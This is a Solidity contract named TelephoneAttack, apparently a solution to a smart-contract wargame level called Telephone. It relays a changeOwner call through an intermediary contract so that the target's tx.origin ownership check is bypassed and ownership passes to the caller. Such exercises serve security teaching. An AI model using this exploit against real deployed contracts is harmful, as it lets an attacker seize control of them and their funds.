// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {

    address public immutable target;
    address public immutable owner;

    error ErrOnlyOwner();
    modifier onlyOwner() {
        if (msg.sender != owner)
            revert ErrOnlyOwner();

        _; // Continue executing the function
    }

    constructor(address trg) {
        owner = msg.sender;
        target = trg;
    }

  function changeOwner() public onlyOwner {
    Telephone(target).changeOwner(msg.sender);
  }
}